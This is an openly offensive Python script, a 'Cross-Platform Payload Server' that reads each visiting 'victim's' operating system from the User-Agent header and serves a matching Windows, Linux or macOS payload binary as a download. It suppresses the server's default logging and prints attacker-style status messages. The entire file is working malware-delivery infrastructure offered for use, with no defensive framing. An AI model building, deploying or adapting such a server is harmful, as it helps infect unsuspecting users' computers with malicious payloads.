#!/usr/bin/env python3
"""
Cross-Platform Payload Server
Detects victim OS and serves the appropriate payload
"""

from http.server import HTTPServer, BaseHTTPRequestHandler
import sys

# Configure your payloads
PAYLOADS = {
    "windows": "payload_windows.exe",
    "linux": "payload_linux.elf", 
    "macos": "payload_macos.bin",
}

class PayloadHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        user_agent = self.headers.get('User-Agent', '').lower()
        
        # Detect OS from User-Agent
        if 'windows' in user_agent:
            payload_file = PAYLOADS["windows"]
            os_detected = "Windows"
        elif 'linux' in user_agent:
            payload_file = PAYLOADS["linux"]
            os_detected = "Linux"
        elif 'mac' in user_agent or 'darwin' in user_agent:
            payload_file = PAYLOADS["macos"]
            os_detected = "macOS"
        else:
            # Default to Windows
            payload_file = PAYLOADS["windows"]
            os_detected = "Unknown (defaulting to Windows)"
        
        print(f"[+] Request from {self.client_address[0]}")
        print(f"[+] User-Agent: {user_agent[:80]}...")
        print(f"[+] OS Detected: {os_detected}")
        print(f"[+] Serving: {payload_file}")
        
        try:
            with open(payload_file, 'rb') as f:
                payload_data = f.read()
            
            self.send_response(200)
            self.send_header('Content-Type', 'application/octet-stream')
            self.send_header('Content-Disposition', f'attachment; filename="{payload_file}"')
            self.send_header('Content-Length', len(payload_data))
            self.end_headers()
            self.wfile.write(payload_data)
            print(f"[✓] Payload delivered successfully!")
            
        except FileNotFoundError:
            print(f"[-] Payload file not found: {payload_file}")
            self.send_response(404)
            self.end_headers()
    
    def log_message(self, format, *args):
        pass  # Suppress default logging

def run_server(port=8080):
    print(f"""
    ╔═══════════════════════════════════════════════════════════╗
    ║           CROSS-PLATFORM PAYLOAD SERVER                   ║
    ╠═══════════════════════════════════════════════════════════╣
    ║  Listening on port: {port:<37} ║
    ║                                                           ║
    ║  Payloads configured:                                     ║
    ║    Windows: {PAYLOADS['windows']:<44} ║
    ║    Linux:   {PAYLOADS['linux']:<44} ║
    ║    macOS:   {PAYLOADS['macos']:<44} ║
    ╚═══════════════════════════════════════════════════════════╝
    """)
    
    server = HTTPServer(('0.0.0.0', port), PayloadHandler)
    print(f"[*] Server running on http://0.0.0.0:{port}/payload")
    print("[*] Waiting for connections...\n")
    
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[!] Server stopped")
        server.shutdown()

if __name__ == "__main__":
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8080
    run_server(port)
